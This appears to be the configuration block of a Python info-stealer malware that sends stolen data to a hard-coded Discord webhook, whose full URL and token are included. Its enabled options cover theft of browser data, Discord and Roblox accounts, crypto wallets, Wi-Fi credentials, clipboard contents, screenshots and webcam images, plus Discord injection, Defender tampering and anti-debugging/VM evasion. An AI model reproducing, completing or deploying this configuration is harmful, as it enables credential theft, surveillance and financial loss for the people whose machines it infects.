__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1277673896102985749/IjWzpk737hoziDUcxpFkBY-CITEzfHer8pfriLDd6OeUSAxmx57puRHiXCufSrHy2sm-', 'ping': True, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'bound_startup': False, 'defender': True, 'systeminfo': True, 'common_files': False, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'wifi': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': False, 'clipboard': True, 'webcam': True, 'games': True, 'screenshot': True, 'mutex': 'TSwQsyuV77JLLb1q', 'wallets': True}
